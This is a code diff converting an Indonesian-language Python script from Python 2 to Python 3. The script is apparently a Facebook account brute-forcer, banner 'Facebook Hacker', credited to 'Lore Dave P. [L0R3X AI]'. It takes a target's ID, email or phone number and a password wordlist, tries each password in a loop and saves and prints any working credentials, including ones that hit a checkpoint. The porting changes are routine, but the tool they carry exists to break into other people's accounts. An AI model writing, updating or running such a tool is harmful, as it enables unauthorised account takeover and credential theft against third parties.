@@ -20,23 +20,39 @@ else:
 from requests.exceptions import ConnectionError
 from mechanize import Browser
 
-reload(sys)
-sys.setdefaultencoding('utf8')
-
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
-internet = '\n\x1b[33;1m     \xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x8f\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\xb3\xe2\x94\x93\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\x83\x1b[32;1m Checking Access\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x83\xe2\x94\xa3\xe2\x94\xab\xe2\x95\xb1\xe2\x95\xb1\xe2\x97\xa2\xe2\x97\xa4\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x83\x1b[32;1m    Internet\n\x1b[33;1m     \xe2\x94\x83\xe2\x94\x97\xe2\x94\x9b\xe2\x94\x97\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\x9b\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xb1\xe2\x94\x83\n\x1b[33;1m     \xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x97\xa2\xe2\x97\xa4\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\n\x1b[35;1m--------------------------------------'
-banner = '\n\033[31;1m____ ____ ____ ____ ___  ____ ____ _  _\n|___ |__| |    |___ |__] |  | |  | |_/\n\033[37;1m|    |  | |___ |___ |__] |__| |__| | \_\n\033[31;1m          _  _ ____ ____ _  _ ____ ____\n          |__| |__| |    |_/  |___ |__/\n\033[37;1m          |  | |  | |___ | \_ |___ |  \\\n\033[36;1mCreated By\033[31;1m :\033[32;1m Lore Dave P. \033[32;1m[\033[37;1mL0R3X AI\033[32;1m]\n\033[35;1m------------------------------------------'
-
+internet = '''
+\x1b[33;1m
+     ╭━━━━━━━━━◢◤━━━━━━━━━╮
+     ┃ ╭━━━━━━━┳━━━━━━━╮ ┃
+     ┃ ┃ ┳━╮   ┃ ╭━┳━╮ ┃ ┃
+     ┃ ┗━┻━╯   ┃ ┗━┻━┛ ┃ ┃
+     ┃           ┗━━━━━┛ ┃
+     ┣━━━━━━━━━━━━━━━━━━━┫
+     ╰━━━━━━━━━━━━━━━━━━━╯
+     Checking Access
+    Internet
+'''
+banner = '''
+\033[31;1m____ ____ ____ ____ ___  ____ ____ _  _
+|___ |__| |    |___ |__] |  | |  | |_/ 
+\033[37;1m|    |  | |___ |___ |__] |__| |__| | \_
+\033[31;1m          _  _ ____ ____ _  _ ____ ____
+          |__| |__| |    |_/  |___ |__/
+\033[37;1m          |  | |  | |___ | \_ |___ |  \\
+\033[36;1mCreated By\033[31;1m :\033[32;1m Lore Dave P. \033[32;1m[\033[37;1mL0R3X AI\033[32;1m]
+------------------------------------------
+'''
 
 def ceknet():
     try:
-        os.system('reset')
+        os.system('clear')
         print(internet)
-        print '\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mMeriksa Koneksi Internet'
+        print('\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mMeriksa Koneksi Internet')
         time.sleep(2)
         toolbar_width = 25
         sys.stdout.write('[%s]' % ('-\033[37;1m' * toolbar_width))
@@ -51,12 +67,12 @@ def ceknet():
         try:
             rq = requests.get('http://facebook.com')
             time.sleep(3.5)
-            print '\033[37;1m] \033[35;1m~> \033[32;1mSuccess '
+            print('\033[37;1m] \033[35;1m~> \033[32;1mSuccess ')
             time.sleep(2.0)
             start()
         except requests.exceptions.ConnectionError:
             time.sleep(3.5)
-            print '\033[37;1m]\033[35;1m ~>\033[31;1m Tidak Ada koneksi'
+            print('\033[37;1m]\033[35;1m ~>\033[31;1m Tidak Ada koneksi')
             time.sleep(1.5)
             sys.exit()
 
@@ -67,17 +83,17 @@ def ceknet():
 
 def start():
     try:
-        os.system('reset')
-        print banner
-        email = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m ID \033[36;1m| \033[37;1mEmail\033[36;1m | \033[37;1mHP \033[31;1m: \033[32;1m')
-        passw = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m File Wordlist   \033[31;1m:\033[32;1m ')
+        os.system('clear')
+        print(banner)
+        email = input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m ID \033[36;1m| \033[37;1mEmail\033[36;1m | \033[37;1mHP \033[31;1m: \033[32;1m')
+        passw = input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m File Wordlist   \033[31;1m:\033[32;1m ')
         total = open(passw, 'r')
         total = total.readlines()
-        print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTarget\033[36;1m :\033[32;1m ' + email
+        print('\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTarget\033[36;1m :\033[32;1m ' + email)
         time.sleep(3.0)
-        print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTotal List \033[36;1m:\033[32;1m ' + str(len(total))
+        print('\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTotal List \033[36;1m:\033[32;1m ' + str(len(total)))
         time.sleep(3.0)
-        print
+        print()
         sandi = open(passw, 'r')
         for pw in sandi:
             try:
@@ -91,11 +107,11 @@ def start():
                     dapat.write('[ID]=> ' + email + '\n')
                     dapat.write('[PW]=> ' + pw)
                     dapat.close()
-                    print '\n\n\033[32;1m[+] \033[37;1mPASSWORD FOUND'
-                    print '\033[32;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
-                    print '\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
-                    print '\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCES'
-                    print '\033[32;1m[=] \033[37;1mProgram Finish'
+                    print('\n\n\033[32;1m[+] \033[37;1mPASSWORD FOUND')
+                    print('\033[32;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email)
+                    print('\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw)
+                    print('\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCES')
+                    print('\033[32;1m[=] \033[37;1mProgram Finish')
                     sys.exit()
                 else:
                     if 'www.facebook.com' in mpsh['error_msg']:
@@ -103,19 +119,19 @@ def start():
                         ceks.write('[ID]=> ' + email + '\n')
                         ceks.write('[PW]=> ' + pw)
                         ceks.close()
-                        print '\n\n\033[33;1m[+] \033[37;1mPASSWORD FOUND'
-                        print '\033[33;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
-                        print '\033[33;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
-                        print '\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[33;1m CHEKPOINT'
-                        print '\033[33;1m[=] \033[37;1mProgram Finish'
+                        print('\n\n\033[33;1m[+] \033[37;1mPASSWORD FOUND')
+                        print('\033[33;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email)
+                        print('\033[33;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw)
+                        print('\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[33;1m CHEKPOINT')
+                        print('\033[33;1m[=] \033[37;1mProgram Finish')
                         sys.exit()
             except requests.exceptions.ConnectionError:
-                print '\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mkoneksi error'
+                print('\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mkoneksi error')
                 sys.exit()
 
     except IOError:
-        print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mAlamat wordlist tidak ada'
-        print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mSaya sarankan Untuk Membuatnya sendiri'
+        print('\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mAlamat wordlist tidak ada')
+        print('\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mSaya sarankan Untuk Membuatnya sendiri')
         sys.exit()
 
 ceknet()
